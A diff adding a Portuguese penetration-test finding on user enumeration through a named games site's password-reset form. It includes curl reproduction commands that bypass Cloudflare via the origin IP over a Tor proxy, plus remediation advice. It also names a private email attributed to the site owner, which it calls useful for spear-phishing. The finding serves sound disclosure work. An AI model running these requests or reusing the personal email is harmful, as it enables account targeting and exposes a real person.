@@ -1,0 +1,93 @@
+# F-019 — User enumeration em /esqueceu-senha (respostas distintas para email cadastrado vs não) [ALTO]
+
+**Host:** `desapegogames.com.br/esqueceu-senha` (via bypass CF `186.226.60.54`)
+**Severidade:** ALTO
+**Status:** CONFIRMADO
+**Data:** 2026-09-05T00:10Z (UTC)
+**OWASP:** A07:2021 — Identification and Authentication Failures (user enumeration)
+**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3 (MEDIUM) — combinação com F-005/F-014 eleva risco.
+
+## Descrição
+
+O endpoint `POST /esqueceu-senha` (campo `email`) retorna respostas
+**distintas e observáveis** para e-mails cadastrados vs não cadastrados,
+permitindo enumeração de contas. Combinado com o bypass Cloudflare (sem
+WAF/rate-limit na origem, F-001) e o login público sem reCAPTCHA (F-014),
+permite confirmar alvos de credential stuffing sem custo.
+
+- **Email CADASTRADO** → `<p class="title text-success">Sucesso!</p>` +
+  "Enviamos um link de recuperação para o seu endereço de e-mail, para que
+  você possa alterar a sua senha. (Verifique a sua caixa de SPAM)." + botão
+  "login" + mascote `mascot-jump.webp`.
+- **Email NÃO cadastrado** → `<p class="title text-danger">Erro!</p>` +
+  "Não existe nenhum usuário cadastrado com esse endereço de e-mail." +
+  botão "criar conta" + mascote `mascot-confused.webp`.
+- Diferença de tamanho: **63 bytes** (119769 vs 119706).
+
+## Reprodução
+
+```bash
+# Email VÁLIDO (owner Diego Trindade — OSINT recon)
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/esqueceu-senha \
+  -d "email=diegobtrindade@hotmail.com"
+# → <p class="title text-success">Sucesso!</p>
+#   <p>Enviamos um link de recuperação para o seu endereço de e-mail...</p>
+#   SIZE=119769
+
+# Email INVÁLIDO
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/esqueceu-senha \
+  -d "email=naoexiste_xyz_99999@desapegogames.com.br"
+# → <p class="title text-danger">Erro!</p>
+#   <p>Não existe nenhum usuário cadastrado com esse endereço de e-mail.</p>
+#   SIZE=119706
+```
+
+### Confirmação cruzada (OSINT)
+- `diegobtrindade@hotmail.com` (owner reconhecido via OSINT/WHOIS) → **CADASTRADO** ("Sucesso!").
+- `comercial@desapegogames.com.br` (email comercial público) → **NÃO cadastrado** como conta de usuário ("Erro!").
+
+### Diferença exata (diff)
+```
+VÁLIDO:   <p class="title text-success">Sucesso!</p>
+          <p>Enviamos um link de recuperação para o seu endereço de e-mail, para que você possa alterar a sua senha. (Verifique a sua caixa de SPAM).</p>
+          <a href="https://desapegogames.com.br/login" ...>login</a>
+          mascot-jump.webp
+
+INVÁLIDO: <p class="title text-danger">Erro!</p>
+          <p>Não existe nenhum usuário cadastrado com esse endereço de e-mail.</p>
+          <a href="https://desapegogames.com.br/cadastro" ...>criar conta</a>
+          mascot-confused.webp
+```
+
+## Impacto
+
+- Enumeração de contas via email: qualquer atacante pode validar se um
+  endereço de e-mail está vinculado a uma conta de usuário (PII
+  disclosure — confirmação de associação email↔conta).
+- Sem WAF (bypass CF) + sem rate-limit observado + sem captcha → enumeração
+  em massa barata (crawl de emails de breaches → validar quais são contas
+  ativas → alvos prioritários para credential stuffing no `/login` sem
+  reCAPTCHA, F-014).
+- Combina com F-005 (5.544 usernames via `/perfil/`) e F-014 (login sem
+  reCAPTCHA): cadeia completa de ataque a contas.
+- Confirmação de conta de admin/owner (e.g. `diegobtrindade@hotmail.com`)
+  é útil para spear-phishing e targeting.
+
+## Recomendação
+
+- Retornar **mensagem idêntica** para cadastrado e não cadastrado
+  ("Se o e-mail existir, enviaremos um link de recuperação") — não distinguir
+  por título/cor/mascote/texto.
+- Adicionar rate limiting no endpoint (e.g. 5 tentativas/IP/hora).
+- Adicionar reCAPTCHA/Turnstile no formulário de recuperação.
+- Restringir origem (F-001: allowlist Cloudflare no nginx) para impedir
+  bypass do WAF.
+- Considerar notificação por email sempre (mesmo para não-cadastrado) ou
+  delay constante independentemente do resultado.
+
+## Referências
+- OWASP A07:2021 — Identification and Authentication Failures
+- CWE-204: Observable Response Discrepancy
+- CWE-307: Improper Restriction of Excessive Authentication Attempts
